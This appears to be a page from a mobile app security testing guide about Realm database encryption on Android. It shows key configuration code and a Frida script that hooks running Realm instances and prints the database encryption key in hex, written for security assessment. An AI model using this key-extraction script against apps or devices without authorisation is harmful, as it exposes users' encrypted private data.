---
masvs_category: MASVS-STORAGE
platform: android
title: Realm Databases
---

The [Realm Database for Java](https://mongodb.com/docs/realm/sdk/java/ "Realm Database") is becoming more and more popular among developers. The database and its contents can be encrypted with a key stored in the configuration file.

```java
//the getKey() method either gets the key from the server or from a KeyStore, or is derived from a password.
RealmConfiguration config = new RealmConfiguration.Builder()
  .encryptionKey(getKey())
  .build();

Realm realm = Realm.getInstance(config);
```

Access to the data depends on the encryption: unencrypted databases are easily accessible, while encrypted ones require investigation into how the key is managed - whether it's hardcoded or stored unencrypted in an insecure location such as shared preferences, or securely in the platform's KeyStore (which is best practice).

However, if an attacker has sufficient access to the device (e.g. root access) or can repackage the app, they can still retrieve encryption keys at runtime using tools like Frida. The following Frida script demonstrates how to intercept the Realm encryption key and access the contents of the encrypted database.

```javascript

'use strict';

function modulus(x, n){
    return ((x % n) + n) % n;
}

function bytesToHex(bytes) {
    for (var hex = [], i = 0; i < bytes.length; i++) { hex.push(((bytes[i] >>> 4) & 0xF).toString(16).toUpperCase());
        hex.push((bytes[i] & 0xF).toString(16).toUpperCase());
    }
    return hex.join("");
}

function b2s(array) {
    var result = "";
    for (var i = 0; i < array.length; i++) {
        result += String.fromCharCode(modulus(array[i], 256));
    }
    return result;
}

// Main Modulus and function.

if(Java.available){
    console.log("Java is available");
    console.log("[+] Android Device.. Hooking Realm Configuration.");

    Java.perform(function(){
        var RealmConfiguration = Java.use('io.realm.RealmConfiguration');
        if(RealmConfiguration){
            console.log("[++] Realm Configuration is available");
            Java.choose("io.realm.Realm", {
                onMatch: function(instance)
                {
                    console.log("[==] Opened Realm Database...Obtaining the key...")
                    console.log(instance);
                    console.log(instance.getPath());
                    console.log(instance.getVersion());
                    var encryption_key = instance.getConfiguration().getEncryptionKey();
                    console.log(encryption_key);
                    console.log("Length of the key: " + encryption_key.length); 
                    console.log("Decryption Key:", bytesToHex(encryption_key));

                }, 
                onComplete: function(instance){
                    RealmConfiguration.$init.overload('java.io.File', 'java.lang.String', '[B', 'long', 'io.realm.RealmMigration', 'boolean', 'io.realm.internal.OsRealmConfig$Durability', 'io.realm.internal.RealmProxyMediator', 'io.realm.rx.RxObservableFactory', 'io.realm.coroutines.FlowFactory', 'io.realm.Realm$Transaction', 'boolean', 'io.realm.CompactOnLaunchCallback', 'boolean', 'long', 'boolean', 'boolean').implementation = function(arg1)
                    {
                        console.log("[==] Realm onComplete Finished..")

                    }
                }

            });
        }
    });
}
```
